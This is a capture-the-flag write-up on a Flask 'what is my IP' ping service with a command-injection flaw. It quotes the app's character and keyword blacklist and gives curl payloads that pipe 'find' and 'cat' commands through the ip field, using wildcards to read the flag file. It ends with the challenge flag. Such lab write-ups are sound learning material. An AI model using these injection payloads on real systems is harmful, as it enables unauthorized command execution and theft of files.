# icanhazip

## Description
> Honestly, I'm sick of all those "whatismyip" websites, so I made my own. Do you think I can make it public in its current state?

Tags: _misc_


## Recon

I was given a Flask application ([app.py](./app.py)) that implements a custom IP service.

Looking through the source code, I spotted several security issues:

#### 1. Command Injection Vulnerability

The application uses `subprocess.run()` with `shell=True` and directly interpolates user input:

```python
result = subprocess.run(
    f"ping -c 4 {ip_address}",
    stdout=subprocess.PIPE,
    text=True,
    shell=True
)
```

This gives me full shell access since I can inject arbitrary commands using shell operators.


#### 2. Incorrect HTTP Method

The `/ping` endpoint uses a non-standard HTTP method:

```python
@app.route('/ping', methods=['PING'])
```

This means I need to use `curl -X PING` instead of a normal GET or POST request.


#### 3. Blacklist Filter

The application implements a basic blacklist to prevent certain characters and keywords:

```python
blacklist = [
    ';', '&', '>', '<', 'flag', 'rm', 'tee', 'shutdown', 'reboot', 'exit'
]
```

However, this blacklist is incomplete - it doesn't block the pipe operator (`|`), and I can bypass the word "flag" using wildcards.

## Exploitation

With the pipe operator available, I could chain commands to search for and read the flag file.

First, I searched for the flag file starting from the root directory. To bypass the blacklist that blocks the word "flag", I used a wildcard pattern:

```bash
curl -X PING https://umvmhxxy.vuln.gg/ping -d "ip=0.0.0.0|find / -name fla*.txt"
```

This returned the location: `/app/fla*.txt`

Next, I used `cat` to read the contents of the flag file, again using wildcards to bypass the blacklist:

```bash
curl -X PING https://umvmhxxy.vuln.gg/ping -d "ip=0.0.0.0|cat /app/fla*.txt"
```


## Flag

`CLA{1_c4n_h4z_c0mm4nd_1nj3ct10n_ALJQjqFRpqPu}`
